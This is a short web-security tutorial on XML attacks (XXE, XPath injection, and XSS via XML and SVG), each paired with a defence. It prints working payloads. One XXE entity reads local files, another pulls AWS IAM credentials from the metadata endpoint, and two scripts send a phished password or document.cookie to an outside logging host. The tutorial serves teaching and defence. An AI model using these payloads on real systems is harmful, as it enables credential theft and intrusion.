# XML Attack

## XXE Attack
**Description**  
XXE stands for XML External Entity.
1. Attacker defines an xxe in an XML file.
2. External file can point to a sensitive file (e.g. database.yml).
3. XML file with an external entity is uploaded and processed by the web application.
4. The content of the sensitive file is returned to the attacker,

**Case Analysis**  
An example of evil XML is shown below. Attacker can see the content of database.yml in the description of Product2 by uploading this XML file to the web application.
```
<!DOCTYPE doctype [
  <!ENTITY myentity SYSTEM "database.yml">
]>

<sell>
  <product>
    <name>Product1</name>
    <price>100</price>
    <description>This is description for Product1.</database>
  </product>
  <product>
    <name>Product2</name>
    <price>200</price>
    <description>&myentity;</database>
  </product>
</sell>
```

**Defend**  
In PHP, one line of code can fix the XXE risk. There are similar methods in other languages.
```
libxml_disable_entity_loader(true)
```
**Advanced Case Analysis**  
Attacker can steal secretAccessKey from AWS by modifying the XXE as follows.
```
<!ENTITY myentity SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access">
```

## XPath Injection
**Description**  
User's controlled data changes the underlying Xpath query.

**Case Analysis**  
Bypass discount code
```
//coupon[code='ABCD' or '*']
Xpath syntax is correct
Find a coupon with an arbitrary valid discount code
The attacker will get for example 50% discount
```
**Defend**  
Data validation: Reject a discount code with non-alphanumeric characters.

## XSS via XML

**Description**  
Attacker can steal user's password by launching an XSS via XML.

**Case Analysis**  
```
<xhtml:html
xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <xhtml:script>
    var pass = prompt("Enter your password to continue");
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://hacking-web-applications.com/log.php?pass="+encodeURI(pass));
    xhr.send();
  </xhtml:script>
</xhtml:html>
```
**Defend**  
Make sure the script included in the XML file is not executed.  
Send the following response header
```
Content-Disposition: attachment; filename="abc.xml"
```
It will force the browser to download file instead of opening it.

## XSS via SVG
**Description**
1. Scripts can be included in SVG files.  
2. Attacker uploads an SVG file with a script.  
3. User visits the SVG file and the script is executed.  
4. Steal some sensitive data from a user

**Case Analysis**  
Attacker can steal user's cookie with session id by the XSS via SVG.
```
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="200" fill="#ddd"></rect>
  <line x1="50" y1="100" x2="250" y2="100" stroke="blue" stroke-width="8" />
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://hacking-web-applications.com/log.php?pass="+encodeURI(document.cookie));
    xhr.send();
  </script>
</svg>
```
**Defend**  
Add an example following code to the header
```
Content-Disposition: attachment; filename="attachment_zxcadw12xc.svg"
```
This is to force browser download this SVG instead of opening it.
